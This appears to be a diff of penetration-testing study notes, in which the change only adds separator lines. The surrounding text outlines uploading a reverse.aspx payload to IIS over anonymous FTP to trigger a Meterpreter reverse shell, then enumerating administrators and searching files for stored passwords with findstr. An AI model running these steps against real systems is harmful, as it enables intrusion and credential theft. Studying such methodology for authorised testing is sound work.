@@ -15,6 +15,8 @@ msfconsole > use exploit/multi/handler > options > set payload windows/meterpret
 **Upload payload to iis:**  
 ftp anonyomous login > `PUT reverse.aspx` > load http://victim/reverse.aspx (to trigger meterpreter reverse shell connection)  
 
+---
+
 #### System Enumeration  
 now that we are a low level user, we repeat the cycle of information gathering, scanning enumeration and further exploitation.  
 
@@ -42,5 +44,7 @@ list all users in the administrator group `net localgroup administrators`
 
 #### Password Hunting  
 (finds string of 'password' in the listed file types WITHIN the current directory) `findstr /si password *.txt *.ini *.config *.xml`  
+
+---
 
 ### Automated Tools
